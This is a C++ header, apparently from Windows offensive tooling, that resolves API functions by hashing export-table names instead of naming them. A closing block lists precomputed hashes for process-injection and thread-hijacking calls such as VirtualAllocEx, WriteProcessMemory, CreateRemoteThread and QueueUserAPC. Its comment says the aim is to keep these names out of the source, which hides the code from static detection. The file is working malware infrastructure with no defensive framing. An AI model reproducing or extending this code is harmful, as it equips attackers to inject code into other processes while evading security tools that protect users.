#pragma once
#include <windows.h>
#include <string>

namespace utils {

    // Simple djb2 hash
    constexpr uint32_t HashApi(const char* str) {
        uint32_t hash = 5381;
        int c;
        while ((c = *str++))
            hash = ((hash << 5) + hash) + c;
        return hash;
    }

    template <typename T>
    T GetProcAddressH(const std::string& library, uint32_t hash) {
        HMODULE hMod = GetModuleHandleA(library.c_str());
        if (!hMod) hMod = LoadLibraryA(library.c_str());
        if (!hMod) return nullptr;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        uint32_t* names = (uint32_t*)((BYTE*)hMod + exports->AddressOfNames);
        uint16_t* ordinals = (uint16_t*)((BYTE*)hMod + exports->AddressOfNameOrdinals);
        uint32_t* functions = (uint32_t*)((BYTE*)hMod + exports->AddressOfFunctions);

        for (uint32_t i = 0; i < exports->NumberOfNames; i++) {
            const char* name = (const char*)((BYTE*)hMod + names[i]);
            if (HashApi(name) == hash) {
                return (T)((BYTE*)hMod + functions[ordinals[i]]);
            }
        }
        return nullptr;
    }
}

// Pre-calculated hashes for common APIs to avoid string literals in the source
#define H_VirtualAllocEx 0x6E0392F1
#define H_WriteProcessMemory 0xD83D6AA1
#define H_VirtualProtectEx 0x4E350E3A
#define H_CreateRemoteThread 0x76A62848
#define H_OpenProcess 0xE9A5A13B
#define H_QueueUserAPC 0xA0F2199F
#define H_GetThreadContext 0x799B7F13
#define H_SetThreadContext 0x0C7A650C
#define H_ResumeThread 0x1E59C7D4
